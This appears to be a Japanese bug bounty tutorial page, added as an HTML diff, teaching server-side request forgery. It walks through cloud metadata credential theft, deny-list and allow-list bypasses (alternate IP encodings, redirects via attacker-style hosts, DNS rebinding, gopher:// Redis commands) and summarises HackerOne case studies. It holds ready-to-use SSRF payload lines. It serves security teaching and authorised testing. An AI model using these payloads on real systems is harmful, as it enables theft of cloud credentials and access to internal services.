@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF (Server-Side Request Forgery) - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+        .diagram { background:var(--surface-raised); border:1px solid var(--border); border-radius:8px; padding:1.5rem; margin:1rem 0; font-family:'Cascadia Code','Fira Code',monospace; font-size:0.82rem; line-height:1.6; white-space:pre; overflow-x:auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; SSRF
+        </div>
+
+        <div class="page-header">
+            <h1>SSRF (Server-Side Request Forgery)</h1>
+            <p class="subtitle">
+                サーバーに「攻撃者の代わりに内部リクエストを送らせる」攻撃。
+                Cloud metadata 取得やファイアウォール越えによる内部サービスアクセスにつながる。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>SSRF の原理</h2>
+
+            <div class="callout">
+                <div class="callout-title">Prerequisites</div>
+                <p>Module 00 (HTTP), 05 (Tools/curl), 06 (DNS/ネットワーク基礎) を先に完了してください。</p>
+            </div>
+
+            <h3>一言で言うと</h3>
+            <p>
+                Webサイトに「この URL の内容を取ってきて」と頼める機能があるとする (画像プレビュー、URLインポートなど)。
+                本来は外部の画像 URL を渡すものだが、代わりに <code>http://社内サーバー/秘密のデータ</code> を渡すと？
+                <strong>サーバーが代わりにアクセスして、内部データを持ってきてしまう。</strong> これが SSRF。
+            </p>
+
+            <h3>仕組み (技術的な説明)</h3>
+            <p>
+                Webアプリケーションが <strong>ユーザーから受け取った URL に対して server-side で HTTP リクエストを発行</strong> する際に、
+                攻撃者がその URL を任意のアドレスに書き換えることで、サーバーの立場から内部ネットワークへアクセスする。
+            </p>
+
+            <div class="mermaid">
+sequenceDiagram
+    participant Attacker as 攻撃者
+    participant Server as 脆弱サーバー
+    participant Meta as 内部メタデータ<br/>(169.254.169.254)
+
+    Attacker->>Server: POST /fetch<br/>url=http://169.254.169.254/metadata
+    Note over Server: URLをそのままfetch
+    Server->>Meta: GET /latest/meta-data/iam/security-credentials/
+    Meta->>Server: AWS AccessKeyId + SecretAccessKey + Token
+    Server->>Attacker: Response (credentials漏洩)
+    Note over Attacker: AWS CLIで横展開可能
+            </div>
+
+            <h3>なぜ危険か</h3>
+            <ul>
+                <li><strong>ファイアウォール越え</strong>: 外部から直接アクセスできない内部サービスに、サーバー経由でアクセス</li>
+                <li><strong>Cloud metadata</strong>: AWS/GCP/Azure の metadata endpoint からクレデンシャルを取得</li>
+                <li><strong>内部 API 呼び出し</strong>: 認証なしの管理API、Kubernetes API、Redis、Elasticsearch 等</li>
+                <li><strong>Port scan</strong>: 内部ネットワークのサービス探索</li>
+                <li><strong>Local file read</strong>: <code>file:///etc/passwd</code> 等の protocol handler 経由</li>
+            </ul>
+
+            <div class="callout">
+                <div class="callout-title">BB での位置付け</div>
+                <p>
+                    SSRF は <strong>TOP100 paid reports の常連</strong>。特に Cloud 環境での credential leak は
+                    一発で Critical になる。2024-2025年で最も報奨金が高い脆弱性クラスの1つ。
+                </p>
+            </div>
+        </div>
+
+        <!-- 発生パターン -->
+        <div class="section">
+            <h2>SSRF が発生するポイント (Attack Surface)</h2>
+
+            <h3>よくある機能</h3>
+            <table>
+                <thead><tr><th>機能</th><th>パラメータ例</th><th>内部動作</th></tr></thead>
+                <tbody>
+                    <tr><td>URL プレビュー / リンク展開</td><td><code>url=</code>, <code>link=</code></td><td>指定 URL を fetch して OGP / title を取得</td></tr>
+                    <tr><td>Webhook 設定</td><td><code>callback_url=</code></td><td>イベント発生時に指定 URL に POST</td></tr>
+                    <tr><td>画像/ファイルの外部取得</td><td><code>image_url=</code>, <code>import_url=</code></td><td>外部リソースをダウンロード</td></tr>
+                    <tr><td>PDF/HTML レンダリング</td><td><code>html=</code> (内部に img src)</td><td>HTML を render する際に外部リソースを fetch</td></tr>
+                    <tr><td>OAuth/SSO の redirect</td><td><code>redirect_uri=</code></td><td>認証後のリダイレクト先</td></tr>
+                    <tr><td>File import (CSV, XML, etc.)</td><td><code>source=</code></td><td>外部ファイルの読み込み</td></tr>
+                    <tr><td>API proxy / gateway</td><td><code>target=</code>, <code>upstream=</code></td><td>バックエンドサービスへの中継</td></tr>
+                </tbody>
+            </table>
+
+            <h3>見落としがちなパターン</h3>
+            <ul>
+                <li><strong>SVG / XML 内の外部参照</strong>: <code>&lt;image href="http://internal/"&gt;</code></li>
+                <li><strong>FFmpeg HLS processing</strong>: 動画ファイル内の playlist URL を fetch</li>
+                <li><strong>Email の image tracking</strong>: HTMLメール内の画像 URL</li>
+                <li><strong>Git import (clone URL)</strong>: リポジトリの clone 先を内部 IP に指定</li>
+                <li><strong>GraphQL の introspection 経由</strong>: query 結果に含まれる URL を後続処理で fetch</li>
+            </ul>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>SSRF の種類</h2>
+
+            <h3>1. Full Response SSRF (完全読み取り)</h3>
+            <p>内部サービスの <strong>response body がそのまま攻撃者に返る</strong>。最も危険。</p>
+<pre><code># Cloud metadata からの credential 取得
+POST /api/fetch-url
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}
+
+# Response に AWS AccessKeyId, SecretAccessKey, Token が返る</code></pre>
+
+            <h3>2. Blind SSRF (レスポンスなし)</h3>
+            <p>リクエストは送れるが、response body は返ってこない。存在確認 + timing で情報を推測。</p>
+<pre><code># Port scan: response time の差で open/closed を判定
+url=http://192.168.1.1:22   → 即座に response (open)
+url=http://192.168.1.1:9999 → timeout 後に response (closed)
+
+# Out-of-band: DNS query / HTTP callback で到達を確認
+url=http://internal-host.attacker-collaborator.net</code></pre>
+
+            <h3>3. Semi-blind SSRF</h3>
+            <p>Response body は返らないが、<strong>status code やエラーメッセージ</strong>から情報を得られる。</p>
+<pre><code># Error message に内部情報が漏洩
+url=http://192.168.1.100:6379
+→ Error: "Connection refused" (Redis ポートが open でない)
+
+url=http://192.168.1.100:8080
+→ Error: "Could not parse response" (何かが応答している = サービスが存在)</code></pre>
+        </div>
+
+        <!-- Cloud metadata -->
+        <div class="section">
+            <h2>Cloud Metadata Endpoints</h2>
+            <p>
+                SSRF で最も Impact が大きいのが Cloud provider の metadata service。
+                <strong>認証なし</strong>で instance に紐づく IAM credential を返す。
+            </p>
+
+            <table>
+                <thead><tr><th>Provider</th><th>Endpoint</th><th>取得できる情報</th></tr></thead>
+                <tbody>
+                    <tr>
+                        <td>AWS (IMDSv1)</td>
+                        <td><code>http://169.254.169.254/latest/meta-data/</code></td>
+                        <td>IAM credentials, hostname, security groups, user-data</td>
+                    </tr>
+                    <tr>
+                        <td>AWS (IMDSv2)</td>
+                        <td>同上 (要 PUT token)</td>
+                        <td>PUT <code>/latest/api/token</code> → GET with token header</td>
+                    </tr>
+                    <tr>
+                        <td>GCP</td>
+                        <td><code>http://metadata.google.internal/computeMetadata/v1/</code></td>
+                        <td>Service account token, project ID (要 <code>Metadata-Flavor: Google</code> header)</td>
+                    </tr>
+                    <tr>
+                        <td>Azure</td>
+                        <td><code>http://169.254.169.254/metadata/instance</code></td>
+                        <td>Managed Identity token (要 <code>Metadata: true</code> header)</td>
+                    </tr>
+                    <tr>
+                        <td>DigitalOcean</td>
+                        <td><code>http://169.254.169.254/metadata/v1/</code></td>
+                        <td>Droplet info, user-data</td>
+                    </tr>
+                    <tr>
+                        <td>Kubernetes</td>
+                        <td><code>https://kubernetes.default.svc/api/v1/</code></td>
+                        <td>Service account token (<code>/var/run/secrets/</code>), pod list</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout danger">
+                <div class="callout-title">IMDSv2 bypass</div>
+                <p>
+                    AWS IMDSv2 は PUT で token を取得する必要があるため、<strong>GET-only の SSRF では取得できない</strong>。
+                    ただし: (1) IMDSv1 が無効化されていない instance がまだ多い、(2) PUT が可能な SSRF sink もある、
+                    (3) container 内からは IMDSv2 hop limit の関係で bypass できるケースがある。
+                </p>
+            </div>
+        </div>
+
+        <!-- 防御と bypass -->
+        <div class="section">
+            <h2>SSRF 防御とその Bypass</h2>
+
+            <h3>防御 1: IP アドレスブロックリスト</h3>
+<pre><code>// よくある deny-list
+const blocked = ['127.0.0.1', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.169.254'];</code></pre>
+
+            <h4>Bypass テクニック</h4>
+            <table>
+                <thead><tr><th>手法</th><th>例</th><th>原理</th></tr></thead>
+                <tbody>
+                    <tr><td>代替 IP 表記</td><td><code>0x7f000001</code>, <code>2130706433</code>, <code>017700000001</code></td><td>16進, 10進, 8進で同じIPを表現</td></tr>
+                    <tr><td>IPv6 mapping</td><td><code>[::ffff:127.0.0.1]</code>, <code>[::1]</code></td><td>IPv6 表記で IPv4 をマッピング</td></tr>
+                    <tr><td>ドメイン使用</td><td><code>localtest.me</code>, <code>127.0.0.1.nip.io</code></td><td>127.0.0.1 に解決されるドメイン</td></tr>
+                    <tr><td>URL encoding</td><td><code>http://%31%32%37%2e%30%2e%30%2e%31/</code></td><td>URL encode した IP</td></tr>
+                    <tr><td>Redirect</td><td><code>http://attacker.com/redirect?to=http://169.254.169.254</code></td><td>allow-listed domain 経由で redirect</td></tr>
+                    <tr><td>DNS rebinding</td><td>最初は allow、2回目に 127.0.0.1 に解決</td><td>DNS TTL=0 で IP を切り替え</td></tr>
+                    <tr><td>URL parser confusion</td><td><code>http://allowed.com@169.254.169.254/</code></td><td>@ 前が user info、parser によって host 判定が異なる</td></tr>
+                </tbody>
+            </table>
+
+            <h3>防御 2: URL Allowlist</h3>
+<pre><code>// 特定ドメインのみ許可
+if (!url.hostname.endsWith('.example.com')) throw new Error('blocked');</code></pre>
+
+            <h4>Bypass テクニック</h4>
+            <ul>
+                <li><code>evil-example.com</code> (suffix match の場合)</li>
+                <li><code>example.com.attacker.com</code> (subdomain として)</li>
+                <li>Open redirect on allowed domain → redirect to internal</li>
+                <li>DNS rebinding (allowed domain の DNS を書き換え)</li>
+            </ul>
+
+            <h3>防御 3: Response validation</h3>
+            <p>Content-Type や response body の形式チェック。</p>
+            <p>Bypass: 内部サービスが返す response が validation を通る形式 (JSON, image header 等) の場合は bypass 不要。</p>
+
+            <div class="callout warning">
+                <div class="callout-title">mei-bb 実体験: DNS Rebinding の落とし穴</div>
+                <p>
+                    GitLab BulkImport での DNS rebinding SSRF (2026-04-28 submit → dup) の教訓:
+                    <code>resolved_address</code> の渡し漏れは <strong>TOCTOU</strong> (Time-of-Check to Time-of-Use) 問題。
+                    DNS を resolve したタイミングと実際に connect するタイミングの間に DNS 応答を切り替える。
+                    GitLab では <code>Gitlab::HTTP_V2::UrlBlocker</code> が resolve → check → connect を 3 step で行うため、
+                    rebind window が存在する。
+                </p>
+            </div>
+        </div>
+
+        <!-- Protocol handlers -->
+        <div class="section">
+            <h2>Protocol Handlers (http:// 以外)</h2>
+            <table>
+                <thead><tr><th>Protocol</th><th>Payload</th><th>取得できるもの</th></tr></thead>
+                <tbody>
+                    <tr><td><code>file://</code></td><td><code>file:///etc/passwd</code></td><td>ローカルファイル読み取り</td></tr>
+                    <tr><td><code>gopher://</code></td><td><code>gopher://127.0.0.1:6379/_SET%20key%20value</code></td><td>Redis, SMTP 等へのプロトコル操作</td></tr>
+                    <tr><td><code>dict://</code></td><td><code>dict://127.0.0.1:6379/INFO</code></td><td>Redis 情報取得</td></tr>
+                    <tr><td><code>ftp://</code></td><td><code>ftp://internal-ftp/</code></td><td>内部 FTP サーバーへの接続</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout">
+                <div class="callout-title">gopher:// が最強の理由</div>
+                <p>
+                    <code>gopher://</code> は <strong>任意の TCP データ</strong> を送信できる。
+                    つまり Redis の <code>SET</code> コマンド、MySQL のログインパケット、SMTP の <code>MAIL FROM</code> 等を
+                    SSRF 経由で発行できる。<code>http://</code> only の SSRF では不可能な internal service exploitation が可能になる。
+                    ただし多くの最新ライブラリでは gopher を無効化済み。
+                </p>
+            </div>
+        </div>
+
+        <!-- Real-World Reports -->
+        <div class="section">
+            <h2>Real-World Reports (HackerOne 実例解析)</h2>
+
+            <h3>Case 1: Lyft — Expense Report SSRF (653 upvotes)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/885975" target="_blank">#885975</a></p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>経費精算システムで「レシートのURL」を送信する機能</li>
+                    <li>サーバーが URL を fetch してレシート画像をダウンロード</li>
+                    <li>URL に <code>http://169.254.169.254/</code> を指定</li>
+                    <li>AWS metadata の response body がそのまま返される (Full SSRF)</li>
+                </ol>
+                <p><strong>学び:</strong> 「画像URL を指定する」機能は SSRF の宝庫。
+                ファイルのダウンロード / プレビュー / サムネイル生成 は全て SSRF sink になりうる。</p>
+            </div>
+
+            <h3>Case 2: Shopify — Exchange SSRF → ROOT access (非公開)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/341876" target="_blank">#341876</a> (572 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>Shopify Exchange (ストア売買プラットフォーム) のスクリーンショット機能</li>
+                    <li>指定URLのスクリーンショットを撮る headless browser がバックエンドで動作</li>
+                    <li>headless browser が GCP の metadata endpoint にアクセス → service account token 取得</li>
+                    <li>取得した token で GCP の内部 API にアクセス → <strong>全 instance への ROOT アクセス</strong></li>
+                </ol>
+                <p><strong>学び:</strong> headless browser (Puppeteer, Playwright, Selenium) を使った
+                スクリーンショット/PDF生成機能は SSRF + file:// の両方が狙える。
+                Cloud metadata + IAM credential → 横展開 で Critical 一直線。</p>
+            </div>
+
+            <h3>Case 3: Dropbox — Full Response SSRF via Google Drive ($17,576)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1406938" target="_blank">#1406938</a> (302 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>Google Drive からファイルをインポートする機能</li>
+                    <li>Google Drive の共有リンクを指定すると、サーバーが file を fetch</li>
+                    <li>リダイレクトを利用して internal service の URL に到達</li>
+                    <li>Response body が full でユーザーに返される</li>
+                </ol>
+                <p><strong>学び:</strong> 「正規サービス (Google Drive, Dropbox) からのインポート」機能でも、
+                redirect chain を利用して SSRF に持ち込める。
+                Allow-list bypass としての open redirect は常に意識する。</p>
+            </div>
+
+            <h3>Case 4: Reddit — Blind SSRF in Matrix Preview ($6,000)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1960765" target="_blank">#1960765</a> (331 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>Reddit のチャット機能でリンクプレビュー (OGP 取得)</li>
+                    <li>Matrix protocol の preview_link API が URL を server-side で fetch</li>
+                    <li>Response body は返らない (Blind) だが、Burp Collaborator で internal DNS resolution を確認</li>
+                    <li>内部ホスト名の列挙 + port scan に成功</li>
+                </ol>
+                <p><strong>学び:</strong> Blind SSRF でも <strong>$6,000</strong>。
+                response が返らなくても、DNS query / HTTP callback で到達を証明できれば報奨対象になる。
+                Burp Collaborator / interact.sh を使った OOB 検出は必須テクニック。</p>
+            </div>
+
+            <h3>Case 5: GitLab — SSRF on project import via remote_attachment_url ($10,000)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/826361" target="_blank">#826361</a> (352 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>GitLab のプロジェクトインポート機能で Note の attachment URL を指定可能</li>
+                    <li>import 処理時にサーバーが <code>remote_attachment_url</code> を fetch</li>
+                    <li>UrlBlocker のチェックを redirect 経由で bypass</li>
+                    <li>内部 Grafana, Redis, PostgreSQL 等にアクセス</li>
+                </ol>
+                <p><strong>学び:</strong> GitLab の import 系機能は SSRF の温床 (BulkImport, project import, repo import)。
+                mei-bb でも BulkImport DNS rebinding を報告した (dup) が、この付近は常にホットな attack surface。</p>
+            </div>
+
+            <h3>Case 6: TikTok — SSRF via FFmpeg HLS ($2,727)</h3>
+            <div class="card">
+                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1062888" target="_blank">#1062888</a> (155 upvotes)</p>
+                <p><strong>仕組み:</strong></p>
+                <ol>
+                    <li>動画アップロード機能のバックエンドで FFmpeg が video を処理</li>
+                    <li>攻撃者が <strong>HLS playlist (.m3u8)</strong> を含む動画ファイルをアップロード</li>
+                    <li>FFmpeg が playlist 内の URL を fetch → 内部ネットワークにリクエスト</li>
+                    <li>response が動画フレームに埋め込まれて返される (Full SSRF)</li>
+                </ol>
+                <p><strong>学び:</strong> 動画処理 (FFmpeg) は「URL を fetch する」処理を内部で行うため SSRF sink になる。
+                同じパターンが WordPress (Automattic #237381) でも報告されている。
+                動画/音声の upload 機能 → FFmpeg → HLS/subtitle/concat 等のパス探索は定石。</p>
+            </div>
+
+            <h3>SSRF 報奨金のパターン分析</h3>
+            <table>
+                <thead><tr><th>SSRF タイプ</th><th>Impact</th><th>報奨金レンジ</th></tr></thead>
+                <tbody>
+                    <tr><td>Full SSRF + Cloud credential leak</td><td>全インフラへのアクセス</td><td>$10,000 ~ $50,000</td></tr>
+                    <tr><td>Full SSRF + internal API access</td><td>データ読み取り</td><td>$5,000 ~ $20,000</td></tr>
+                    <tr><td>Full SSRF (response body readable)</td><td>内部情報漏洩</td><td>$3,000 ~ $10,000</td></tr>
+                    <tr><td>Blind SSRF + DNS/port scan</td><td>内部 infra 情報</td><td>$1,000 ~ $6,000</td></tr>
+                    <tr><td>Blind SSRF (OOB only)</td><td>到達の証明のみ</td><td>$500 ~ $3,000</td></tr>
+                    <tr><td>SSRF → RCE chain</td><td>コード実行</td><td>$15,000 ~ $50,000</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Detection methodology -->
+        <div class="section">
+            <h2>検出方法</h2>
+
+            <h3>Step 1: SSRF Sink の発見</h3>
+            <ol>
+                <li>URL を受け取るパラメータを全て列挙: <code>url=</code>, <code>link=</code>, <code>callback=</code>, <code>redirect=</code>, <code>source=</code>, <code>image=</code></li>
+                <li>Hidden parameters: <code>Arjun</code> や <code>x8</code> でパラメータ discovery</li>
+                <li>File upload 機能 (SVG, PDF, DOCX, video) も間接的 sink</li>
+            </ol>
+
+            <h3>Step 2: Out-of-Band 到達確認</h3>
+<pre><code># Burp Collaborator / interact.sh で到達確認
+url=http://BURP-COLLABORATOR-ID.oastify.com
+
+# DNS のみの OOB (HTTP が block されていても DNS は通ることが多い)
+url=http://ssrf-test.COLLABORATOR.com</code></pre>
+
+            <h3>Step 3: Bypass / Escalation</h3>
+<pre><code># localhost 各種表記
+url=http://127.0.0.1/
+url=http://0.0.0.0/
+url=http://[::1]/
+url=http://0x7f000001/
+url=http://2130706433/
+url=http://127.1/
+url=http://0177.0.0.1/
+
+# Cloud metadata
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Redirect bypass
+url=http://your-server.com/redirect?to=http://169.254.169.254/
+
+# DNS rebinding
+url=http://your-rebind-service.com/  (1st: allowed IP → 2nd: 127.0.0.1)</code></pre>
+
+            <h3>Step 4: Impact 最大化</h3>
+            <ul>
+                <li>Cloud metadata → IAM credential → <code>aws sts get-caller-identity</code> で確認</li>
+                <li>Internal service → Redis SLAVEOF / EVAL で RCE</li>
+                <li>Internal service → Kubernetes API で pod 一覧取得</li>
+                <li>Local file → <code>file:///proc/self/environ</code> で環境変数 (DB password 等)</li>
+            </ul>
+        </div>
+
+        <!-- mei-bb experience -->
+        <div class="section">
+            <h2>mei-bb 実体験: GitLab DNS Rebinding SSRF</h2>
+            <div class="card">
+                <h4>概要</h4>
+                <p>
+                    GitLab BulkImport の 3 pipeline (<code>repository</code>, <code>wiki</code>, <code>snippets</code>) で
+                    <code>fetch_as_mirror</code> に <code>resolved_address</code> が渡されていない問題。
+                    DNS rebinding (TOCTOU) で internal host にアクセス可能。
+                </p>
+
+                <h4>結果: Duplicate</h4>
+                <p>
+                    2026-04-28 に提出したが、先行 report #3565700 に集約済みで即日 dup。
+                    同 root cause の「encoding/placement variant」は全て 1 report に consolidated される。
+                </p>
+
+                <h4>教訓</h4>
+                <ul>
+                    <li>GitLab のような大手では SSRF の「variant」は dup 確率が高い</li>
+                    <li><code>resolved_address</code> 系は全て redzone — 別の sink を探す必要がある</li>
+                    <li>SSRF bypass のテクニックは同じだが、<strong>新しい entry point</strong> を見つけることが key</li>
+                </ul>
+            </div>
+
+            <div class="callout warning">
+                <div class="callout-title">mei-bb 教訓: SSRF verify の落とし穴</div>
+                <p>
+                    <strong>「localhost に到達できた」だけでは脆弱性にならない</strong> ケースがある:
+                </p>
+                <ul>
+                    <li>Fetched content が「攻撃者が public URL から直接取得できるものと同じ」なら impact ゼロ</li>
+                    <li>公開 API の proxy として動いているだけで、internal-only data にアクセスできない</li>
+                    <li>Response が attacker に返らない + side-effect もない = Blind SSRF ですらない</li>
+                </ul>
+                <p>(参照: feedback_bb_ssrf_localhost_self_audit — Vaultwarden 2026-04-29 self-correction)</p>
+            </div>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice</h2>
+
+            <h4>Web Security Academy Labs</h4>
+            <ol>
+                <li><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost" target="_blank">Basic SSRF against local server</a> (Apprentice)</li>
+                <li><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system" target="_blank">Basic SSRF against another back-end system</a> (Apprentice)</li>
+                <li><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" target="_blank">SSRF with blacklist-based input filter</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter" target="_blank">SSRF with whitelist-based input filter</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection" target="_blank">Blind SSRF with out-of-band detection</a> (Practitioner)</li>
+                <li><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-open-redirection" target="_blank">SSRF via open redirection</a> (Practitioner)</li>
+            </ol>
+
+            <h4>自習用ツール</h4>
+            <ul>
+                <li><strong>Burp Collaborator</strong> (Pro) / <strong>interact.sh</strong> (無料): OOB 検出</li>
+                <li><strong>SSRFmap</strong>: 自動 SSRF exploitation ツール</li>
+                <li><strong>Gopherus</strong>: gopher:// payload generator (Redis, MySQL, SMTP 等)</li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>URL を受け取る全ての機能</strong>が SSRF sink の候補 — 特に画像/ファイル取得, webhook, import 系</li>
+                    <li><strong>Cloud metadata (169.254.169.254)</strong> は SSRF の最高 impact — credential leak で Critical 確定</li>
+                    <li><strong>Blind SSRF でも報奨対象</strong> — OOB (DNS callback) で到達を証明できれば $1,000~</li>
+                    <li><strong>Bypass は組み合わせ</strong> — IP 表記変換 + redirect + DNS rebinding を段階的に試す</li>
+                    <li><strong>gopher:// は最強だが稀</strong> — 使える場合は Redis/SMTP 操作で RCE まで狙える</li>
+                    <li><strong>FFmpeg HLS</strong> — 動画 upload 機能は見落としやすい SSRF sink</li>
+                    <li><strong>「到達できた」≠「脆弱」</strong> — internal-only data へのアクセスが証明できるかが分かれ目</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/ssrf" target="_blank">PortSwigger: SSRF</a></li>
+                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP: SSRF Prevention</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">PayloadsAllTheThings: SSRF</a></li>
+                <li><a href="https://blog.assetnote.io/" target="_blank">Assetnote Blog</a> — SSRF research のトップ</li>
+            </ul>
+        </div>
+
+        <div style="text-align:center; margin: 2rem 0;">
+            <button class="complete-btn" data-module-id="12-ssrf" onclick="toggleComplete('12-ssrf')">Mark Complete</button>
+        </div>
+
+        <div class="page-nav">
+            <a href="11-sqli.html">&larr; 前: SQL Injection</a>
+            <a href="13-idor.html">次: IDOR &rarr;</a>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true,theme:'dark',themeVariables:{primaryColor:'#1f2a3f',primaryTextColor:'#e6edf3',primaryBorderColor:'#30363d',lineColor:'#58a6ff',secondaryColor:'#161b22',tertiaryColor:'#161b22'}});</script>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
